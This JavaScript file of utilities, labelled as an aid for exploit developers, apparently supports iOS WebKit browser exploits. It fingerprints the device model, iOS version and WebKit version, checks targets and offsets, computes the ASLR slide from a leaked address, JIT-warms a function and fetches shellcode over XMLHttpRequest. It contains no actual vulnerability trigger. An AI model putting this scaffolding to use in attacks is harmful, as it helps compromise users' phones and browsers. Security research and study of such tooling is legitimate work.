/*
 * Generic utillities to make the life of a javascript exploit developer easier
*/

// Errors
var ERR_NOT_NUM = function(arg){throw arg+" must be a numeric value";};
var ERR_NOT_DEF = function(arg){throw arg+" is not defined";};
var ERR_NOT_EXPECTED = function(arg){throw arg+" is not the expected value for the provided logic flow";};
var ERR_OVERFLOW = function(arg){throw arg+" would overflow the target";};
var ERR_UNSUPPORTED = function(arg){throw arg+" is not supported at this time"};


// PWM-like sleep, useful to prevent gc()
function millis(ms)
{
	var t1 = Date.now();
    while(Date.now() - t1 < ms)
    {
    	//Simply wait
    }
}

/*
 * Generic Hex-Dec operations
*/
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Convert a decimal to a hex string
function hexify(intval = 0)
{
	return '0x'+parseInt(intval).toString(16);
}

// Convert a set of bytes into a hex string
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Convert a hex string to a set of bytes
function unhexlify(hexstr) 
{
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

/*
 * Functions for dealing with exploit offsets and addresses
*/

// Calculate the dyld shared cache its randomization slide and return it
var dyld_cache_slide = function(addr_off = 0, addr_leak = 0)
{

	dyld_cache_slide = function()
	{
		var slide = addr_leak - addr_off;
		return slide >= 0 ? slide : 0;
	};
};

// Get a slid address
var slideaddr = function(addr = 0)
{
	return addr + dyld_cache_slide();
};

// Get the unslid address
var unslideaddr = function(addr = 0)
{
	return addr - dyld_cache_slide();
};


/*
 * Logging functionality
*/
//window.alert = function(){};
var log = {

	debug: false,
	debugserver: location.protocol+'//'+location.host,
	debugroute: '/debug/?msg=',
	error: function(msg='')
	{
		alert("[X] "+msg);
		console.error(msg);
		throw new Error(msg);
	},
	warn: function(msg='')
	{
		alert("[!] "+msg);
		console.warn(msg);
	},
	info: function(msg = '') 
	{
		alert("[i] "+msg);
		console.info(msg);
	},
	debug: function(msg='')
	{
		if(this.debug)	
		{
			this.info(msg);
			var req = new XMLHttpRequest();
			req.open('GET', this.debugserver+this.debugroute+msg, false);
			req.send(null);
		}
	}
};


/*
 * Assertions
*/

// Compare and assert if zero
function assert(rule = true)
{
	if(!rule) 
	{
		log.error("Assertion failed.");
	}
}

// Assert if object is undefined.
function assert_defined(obj)
{
	if((typeof obj !== 'undefined') != true)
	{
		log.error("Assertion failed: Object is not defined");
	}
}

function detect_device()
{

	var gpu = function()
	{

		function parseGPU(gpu) {
		    if(!gpu) return "Unknown GPU";
		    if(gpu) gpu = gpu.split('Apple ');
		    if(gpu.length > 1) gpu = gpu[1].split(' GPU')[0];
		    return gpu || "unknown";
		}
		var ctx = document.createElement('canvas');
		ctx.gl = ctx.getContext('experimental-webgl');
		ctx.ext = ctx.gl.getExtension('WEBGL_debug_renderer_info');
		var _gpu = parseGPU(ctx.gl.getParameter(ctx.ext.UNMASKED_RENDERER_WEBGL));
		ctx = undefined;
		return _gpu;
	}();

	var width = window.screen.width || 0;
	var height = window.screen.height || 0;
	var t = "unknown";	    
    if(navigator.userAgent.indexOf('iPhone') > -1) {
        t = "iPhone";
    }

	if(navigator.userAgent.indexOf('iPad') > -1) {
	   t = "iPad";
	}

	if(navigator.userAgent.indexOf('iPod') > -1) {
        t = "iPod";
    }

    if(t === "iPhone") {
        if(height <= 480) return ['iPhone 2G', 'iPhone 3', 'iPhone 3GS'];

        if(width === 320 && height === 480 && gpu =='A4') return ['iPhone 4'];
        
        if(width === 320 && height === 480 && gpu == 'A5') return ['iPhone 4S'];
        if(width === 320 && height === 568 && gpu == 'A5') return ['iPhone 5'];
        
        if(width === 320 && height === 568 && gpu == 'A6') return ['iPhone 5C'];
        
        if(width === 320 && height === 568 && gpu == 'A7') return ['iPhone 5S'];
        
        if(width === 375 && height === 667 && gpu == 'A8') return ['iPhone 6'];
        if(width === 414 && height === 736 && gpu == 'A8') return ['iPhone 6+'];
        
        if(width === 375 && height === 667 && gpu == 'A9') return ['iPhone 6S'];
        if(width === 414 && height === 736 && gpu == 'A9') return ['iPhone 6S+'];
        if(width === 320 && height === 568 && gpu == 'A9') return ['iPhone SE'];
        
        if(width === 375 && height === 667 && gpu == 'A10') return ['iPhone 7'];
        if(width === 414 && height === 736 && gpu == 'A10') return ['iPhone 7+'];
        
        if(width === 375 && height === 667 && gpu == 'A11') return ['iPhone 8'];
        if(width === 414 && height === 736 && gpu == 'A11') return ['iPhone 8+'];
        if(width === 375 && height === 812 && gpu == 'A11') return ['iPhone X'];
        if(gpu == "A12") return ['iPhone XR and up.'];
    }

    else if(t === "iPad") {
        /* iPads */
        if(width === 768 && height === 1024 && gpu == 'A5') return ['iPad Mini', 'iPad 2'];
        
        if(width === 768 && height === 1024 && gpu == 'A7') return ['iPad Mini 2', 'iPad Mini 3', 'iPad Air'];
        
        if(width === 768 && height === 1024 && gpu == 'A8') return ['iPad Mini 4'];
        
        if(width === 768 && height === 1024 && gpu == 'A5X') return ['iPad 3'];
        
        if(width === 768 && height === 1024 && gpu == 'A6X') return ['iPad 4'];
        
        if(width === 768 && height === 1024 && gpu == 'A8X') return ['iPad Air 2'];
        
        if(width === 768 && height === 1024 && gpu == 'A9X') return ['9.7-inch iPad Pro'];
        
        if(width === 768 && height === 1024 && gpu == 'A10') return ['iPad 6 (Cellular)'];

        if(width === 834 && height === 1112 && gpu == 'A10X') return ['10.5-inch iPad Pro'];
        if(width === 1024 && height === 1366 && gpu == 'A10X') return ['12.9-inch iPad Pro'];
    
    } else {
    
        if(width === 272 && height === 340 && gpu == 'S1') return ['Watch 1 38mm'];
        if(width === 312 && height === 390 && gpu == 'S1') return ['Watch 1 42mm'];
        
        if(width === 272 && height === 340 && gpu == 'S1P') return ['Watch 1 sport 38mm'];
        if(width === 312 && height === 390 && gpu == 'S1P') return ['Watch 1 sport 42mm'];
        
        if(width === 272 && height === 340 && gpu == 'S2') return ['Watch 2 38mm'];
        if(width === 312 && height === 390 && gpu == 'S2') return ['Watch 2 42mm'];
        
        if(width === 272 && height === 340 && gpu == 'S3') return ['Watch 3 38mm'];
        if(width === 312 && height === 390 && gpu == 'S3') return ['Watch 3 42mm'];
    }
    
    return ["Unknown device"];
}

function detect_os()
{
	return {
		mobile: (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1),
		webkit: parseFloat(/AppleWebKit\/([\d.]+)/.exec(navigator.userAgent)[1]) || 0,
		safari: window.navigator.userAgent.indexOf('Safari') > -1,
		version: function()
		{
			var match = (navigator.appVersion).match(/OS (\d+)_(\d+)_?(\d+)?/);
	      	if(match) {
		        var version = [
		            parseInt(match[1], 10),
		            parseInt(match[2], 10),
		            parseInt(match[3] || 0, 10)
		        ];
		        return parseFloat(version[0]+'.'+version[1]+version[2]);
		    } else {
		    	return "unknown";
		    }
		}()
	};
}

function fingerprint_osdevice()
{
	if(typeof window.currentdevice !== 'undefined')
	{
		return window.currentdevice;
	}
	var _device = detect_device();
	var _os = detect_os();
	window.currentdevice = {device: _device, os: _os};
	return {device: _device, os: _os};
}

var supported_targets = [
];

var target = function target(device, osvers, webkitvers)
{
	return {device: device, osvers: osvers, webkit: webkitvers};
};

function SupportTarget(device, osvers, webkitvers)
{
	supported_targets.push(new target(device, osvers, webkitvers));
}

function issupported()
{
	var d = fingerprint_osdevice();
	for(i = 0; i < supported_targets.length; i++)
	{
		var tgt = supported_targets[i];
		if(d.device.includes(tgt.device) && (tgt.osvers == d.os.version) && ((d.webkit == tgt.webkit) || tgt.webkit == "any"))
		{
			return true;
		}
	}
	return false;
}

function assert_offsets()
{
	function missing_offsets(req='iOS version'){
		var btn = document.querySelector("#btn");
		btn.innerText = "unsupported";
		btn.setAttribute('class','unsupported');
		btn.onclick = function(){alert('You need to add offsets for your '+req+'.');};
		throw "Missing offsets";
	}

	// Real dirty, this should be based off device detection, see utils.js
	// The offsets here are from 12.0.1 iPhone 6S
	if(typeof offsets[currentdevice.os.version] === 'undefined')
	{
		missing_offsets();
	}

	if(typeof offsets[currentdevice.os.version][currentdevice.device[0]] === 'undefined')
	{
		missing_offsets("device");
	}
}

function str2ab(str = '')
{
	return new TextEncoder().encode(str).buffer;
};

function load_shellcode(url = '', async = true, name='shellcode_view', callback = function(req){})
{
	var req = new XMLHttpRequest();
	req.open("GET", url, async);
	if(async){
		req.responseType = "arraybuffer";
		if(callback){
			req.addEventListener('load', callback);
			req.send(null);
			return;
		} else {
			req.send(null);
		}
	} 
	else {
		req.send(null);
		return req.responseText;
	}
};

var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
var FPO = spectre ? 0x18 : 0x10; 

function makejitfunc()
{
	function target(num) {
    	for (var i = 2; i < num; i++) {
        	if (num % i === 0) {
            	return false;
        	}
    	}
		return true;
	}

    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}
